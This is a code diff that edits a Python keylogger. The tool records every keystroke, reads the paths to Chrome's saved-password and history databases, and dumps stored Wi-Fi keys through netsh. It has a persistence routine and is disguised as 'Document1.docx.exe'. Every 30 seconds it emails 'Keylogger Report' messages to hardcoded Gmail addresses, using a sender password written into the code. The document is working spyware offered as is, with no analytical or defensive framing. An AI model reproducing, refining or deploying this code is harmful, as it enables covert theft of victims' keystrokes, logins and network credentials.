@@ -1,16 +1,17 @@
-import keyboard
 import smtplib
+from email import encoders
+from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-from os import path, getcwd
-from time import sleep
+from os import getcwd, path
 from subprocess import check_output
+from time import sleep
+
+import keyboard
 
 SENDING_INTERVAL = 30
 SENDER = "momo.lareinedesmouettes15@gmail.com"
-RECEIVERS = ["momo.lareinedesmouettes15@gmail.com", "tbdo@pm.me"]
+RECEIVERS = ["momo.lareinedesmouettes15@gmail.com","bdouilleur@gmail.com"]
 PASSWORD = "Momo123#"
 
 KEYLOGGER_FILE = "Document1.docx.exe"
@@ -20,35 +21,37 @@ log = ""
 typed_string = ""
 
 
-def logprint(text):
+def logprint(text, overwrite=False):
     global log
     print(text)
-    log += text
+    if overwrite:
+        log = text
+    else:
+        log += text
 
 
 def on_press(event):
     global log, typed_string
-    logprint(f"name: {event.name}\ncode:{event.scan_code}\ntime:{event.time}")
-    log += f"{event.time}:Key {event.name} pressed (Code:{event.scan_code})\n"
+    logprint(f"{event.time}:Key {event.name} pressed (Code:{event.scan_code})\n")
     typed_string += f"{event.name}"
 
 
 def get_chrome_data():
     '''Returns a list with the respective paths of the login and history SQL databases'''
     global log
-    logprint("INFO: Attempting to retrieve chrome data...")
+    logprint("INFO: Attempting to retrieve chrome data...\n")
     data_path = path.expanduser('~').replace(
         "\\", '/') + "/AppData/Local/Google/Chrome/User Data/Default"
     login_db_path = path.join(data_path, 'Login Data')
     history_db_path = path.join(data_path, 'History')
-    logprint("INFO: Successfully retrieved chrome data.")
+    logprint("INFO: Successfully retrieved chrome data.\n")
     return [login_db_path, history_db_path]
 
 
 def get_wifi_data():
     ''' Returns a list of all known wifi credentials'''
     global log
-    logprint("INFO: Attempting to retrieve wifi data...")
+    logprint("INFO: Attempting to retrieve wifi data...\n")
     data = check_output(['netsh', 'wlan', 'show', 'profiles'
                          ]).decode('utf-8',
                                    errors="backslashreplace").split('\n')
@@ -74,8 +77,12 @@ def get_wifi_data():
             credential_set["Key"] = "[Unknown]"
         finally:
             credentials_list.append(credential_set)
-    logprint("INFO: Successfully retrieved wifi data.")
-    return credentials_list
+    file_path = "{}/wifi.json".format(path.expanduser('~').replace('\\', '/'))
+    logprint(f"INFO: Writing data to {file_path}\n")
+    with open(file_path,"w") as file:
+        file.write(credentials_list) 
+    logprint("INFO: Successfully retrieved wifi data.\n")
+    return file_path
 
 
 def make_persistent(current_file_name):
@@ -95,7 +102,7 @@ def make_persistent(current_file_name):
 
 
 def send_results(file_paths=[]):
-    logprint("INFO: Running sending check...")
+    print("INFO: Running sending check...")
     global log, typed_string
     if log != "":
         logprint("INFO: New logs detected.")
@@ -103,10 +110,10 @@ def send_results(file_paths=[]):
 
         msg = MIMEMultipart()
         msg['From'] = SENDER
-        msg['To'] = RECEIVERS
+        msg['To'] = ",".join(RECEIVERS)
         msg['Subject'] = "Keylogger Report"
 
-        body = f"Log (since program launch):\n{log}\nTyped string(since last report):\n{typed_string}."
+        body = f"Report:\nLog (since last report):\n{log}\n\n\n\nTyped string(since program launch):\n{typed_string}\n\n\n\n{'Attached files' if file_paths else ''}."
         msg.attach(MIMEText(body, 'plain'))
 
         if file_paths:
@@ -120,39 +127,40 @@ def send_results(file_paths=[]):
 
         text = msg.as_string()
         logprint(
-            f"INFO: Connecting to GMail SMTP server, with username {sender} and password {password}."
+            f"INFO: Connecting to GMail SMTP server, with username {SENDER} and PASSWORD {PASSWORD}.\n"
         )
         try:
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
-            server.login(sender, password)
+            server.login(SENDER, PASSWORD)
         except Exception as e:
             logprint(
-                f"ERROR: Couldn't connect to server, see error traceback below\n{type(e)}\n{str(e)}"
+                f"ERROR: Couldn't connect to server, see error traceback below\n{type(e)}\n{str(e)}\n"
             )
-            logprint(f"ERROR: Mailing failed.")
+            logprint(f"ERROR: Mailing failed.\n")
         else:
             try:
-                logprint(f"INFO: Sending from {sender} to {receivers}...")
-                server.sendmail(sender, receivers, text)
+                logprint(f"INFO: Sending from {SENDER} to {RECEIVERS}...\n")
+                server.sendmail(SENDER, RECEIVERS, text)
                     
             except Exception:
                 logprint(
-                    f"ERROR: Couldn't send mail, see error traceback below\n{type(Exception)}\n{str(Exception)}"
+                    f"ERROR: Couldn't send mail, see error traceback below\n{type(Exception)}\n{str(Exception)}\n"
                 )
-                logprint(f"ERROR: Mailing failed.")
+                logprint(f"ERROR: Mailing failed.\n")
             else:
-                logprint("INFO: Mailing successful.")
+                logprint("INFO: Mailing successful.\n")
                 server.quit()
-                log = ""
-                logprint('INFO: Cleared "log" variable.')
+                logprint('INFO: Cleared "log" variable.\n')
+                logprint("",overwrite=True)
     else:
-        logprint("INFO: No new keyboard input.")
+        print("INFO: No new keyboard input.")
 
 
 keyboard.on_press(on_press)
 #get_chrome_data()
 #get_wifi_data()
+#make_persistent()
 while 1:
     sleep(SENDING_INTERVAL)
     send_results()
